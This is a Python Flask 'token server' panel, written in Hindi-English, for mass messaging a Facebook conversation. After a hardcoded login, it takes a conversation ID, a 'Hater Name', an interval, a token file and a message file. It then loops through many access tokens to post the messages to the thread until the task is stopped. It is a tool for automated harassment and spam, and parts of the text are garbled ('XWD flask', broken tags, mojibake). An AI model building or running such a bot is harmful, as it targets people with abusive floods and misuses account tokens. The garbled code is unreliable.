XWD flask import Flask, request, render_template_string, redirect, url_for, session
import requests
from threading import Thread, Event
import time
import os
import random
import string

app = Flask(__name__)
app.secret_key = 'secret_key_for_session_management'  # Replace with a strong secret key

USERNAME = "RKRAJA"
PASSWORD = "rkraja77"

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    max_tokens = len(access_tokens)
    num_messages = len(messages)
    
    message_index = 0
    while not stop_event.is_set():
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = f"{mn} {messages[message_index % num_messages]}"
            
            parameters = {'access_token': access_token, 'message': message}
            post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            response = requests.post(post_url, json=parameters, headers=headers)
            
            if response.ok:
                print(f"[+] Message Sent: {message} using Token {token_index + 1}")
            else:
                print(f"[x] Failed to send: {message}")
            
            message_index += 1
            time.sleep(time_interval)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(30)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('send_message'))
        else:
            return '''
            <h3 style="color:#d32f2f;">Invalid credentials. Please try again.</h3>
            <a href="/login" style="color:#bb86fc;">Go back to Login</a>
            '''
    return '''
        <html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page - Username Password</title>
    <style>
        body {
            background: linear-gradient(to bottom, #0d001a, #1a0033, #000814);
            background-size: cover;
            background-attachment: fixed;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #e0bbff;
            margin: 0;
            padding: 0;
            height: 100vh;
        }

        .login-container {
            max-width: 420px;
            margin: 120px auto;
            padding: 36px30px;
            background: rgba(10, 5, 25, 0.75);
            border-radius: 18px;
            border: 1px solid #4a148c;
            box-shadow: 0 0 35px rgba(138, 43, 226, 0.25);
        }

        .login-container h2 {
            text-align: center;
            color: #d1c4e9;
            font-family: 'Georgia', cursive;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }

        .login-container label {
            display: block;
            margin-bottom: 8px;
            font-size: 15px;
            color: #ce93d8;
        }

        .login-container input {
            width: 100%;
            padding: 15px
            margin-bottom: 22px;
            border: 1px solid #7e57c2;
            border-radius: 12px;
            background: rgba(30, 20, 50, 0.4);
            color: #f3e5f5;
            font-size: 16px;
        }

        .login-container input::placeholder {
            color: #9575cd;
        }

        .login-container button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #7b1fa2, #ab47bc);
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 17px;
            transition: all 0.4s;
        }

        .login-container button:hover {
            background: linear-gradient(to right, #880e4f, #c2185b);
            transform: translateY(-2px);
        }

        .warning {
            margin-top: 25px;
            text-align: center;
            font-size: 14px;
            color: #f46fb1;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form method="post">
            <h2>Log in</h2>
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter Username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Enter</button>
        </form>
        <div class="warning">
            <p><strong>Note:</strong> Username ya password ke liye admin se contact karein.</p>
        </div>
    </div>
</body>
</html>
    '''

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        access_tokens = txt_file.read().decode().strip().splitlines()

        messages_file = request.files['messagesFile']
        messages = messages_file.read().decode().strip().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task shuru ho gaya 鈫� ID: {task_id}'

    return '''
        <html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <ttitl>🔥RK RAJA TOKEN SERVER 🖤🌻</title>
    <style>
        body {
            background: linear-gradient(to bottom, #0f001a, #190033, #000d1a);
            background-size: cover;
            background-attachment: fixed;
            color: #d7bde2;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 720px;
            margin: 0 auto;
            background: rgba(15, 10, 35, 0.72);
            border-radius: 22px;
            padding: 35px;
            border: 1px solid #4a148c;
            box-shadow: 0 0 40px rgba(123, 31, 162, 0.3);
        }

        label {
            color: #ce93d8;
            font-weight: 500;
            display: block;
            margin-bottom: 8px;
        }

        .form-control {
            width: 100%;
            padding: 12px;
            margin-bottom: 18px;
            border: 1px solid #7e57c2;
            border-radius: 10px;
            background: rgba(30, 20, 50, 0.45);
            color: #f3e5f5;
            font-size: 15px;
        }

        .form-control:focus {
            outline: none;
            border-color: #ab47bc;
            box-shadow: 0 0 10px rgba(171, 71, 188, 0.4);
        }

        .btn-submit {
            padding: 12px 35px;
            background: linear-gradient(to right, #7b1fa2, #ab47bc);
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.4s;
            margin: 15px 0 10px 0;
        }

        .btn-submit:hover {
            background: linear-gradient(to right, #880e4f, #c2185b);
            transform: translateY(-2px);
        }

        h3 {
            text-align: center;
            color: #e1bee7;
            font-family: 'Georgia', cursive;
            margin-bottom: 25px;
            letter-spacing: 1.5px;
        }

        h2 {
            text-align: center;
            color: #9576cd;
            font-size: 14px;
            margin-top: 30px;
        }

        .logout {
            text-align: center;
            margin: 35px 0 20px;
        }

        .logout a {
            color: Green;
            font-size: 16px;
            font-weight: bold;
            text-decoration: none;
            background: #c2185b;
            padding: 12px 30px;
            border-radius: 12px;
            transition: all 0.3s;
        }

        .logout a:hover {
            background: #880e4f;
        }
    </style>
</head>
<body>
    <div class="container">
        <h3>饾悧饾悓饾悁饾悜饾悡饾悩 饾悁饾悩饾悢饾悞饾悋 饾悐饾悎饾悕饾悊 -OFFLINE SERVER</h3>
        <form method="post" enctype="multipart/form-data">
            <div>
                <label for="threadId">Conversation ID:</label>
                <input type="text" class="form-control" id="threadId" name="threadId" placeholder="Conversation ID" required>
            </div>
            <div>
                <label for="kidx">Hater Name:</label>
                <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Hater Name" required>
            </div>
            <div>
                <label for="time">Time Interval (secoKingabel>
                <input type="number" class="form-control" id="time" name="time" placeholder="Time Interval (seconds)" required>
            </div>
            <div>
                <label for="txtFile">Upload Token File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div>
                <label for="messagesFile">Upload Messages File:</label>
                <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>
            </div>
            <button type="submit" class="btn-submit">Start Task</button>
        </form>

        <form method="post" action="/stop">
            <div>
                <label for="taskId">Task ID to stop:</label>
                <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Task ID to stop" required>
            </div>
            <button type="submit" class="btn-submit">Stop Task</button>
        </form>

        <div class="logout">
            <a href="/logout">Logout</a>
        </div>

        <h2>Made with pain by: RK RAJA XWD <King>
    </div>
</body>
</html>
    '''

@app.route('/stop', methods=['POST'])
def stop_task():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task {task_id} roka gaya."
    else:
        return f"Task ID {task_id} nahi mila."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000) 
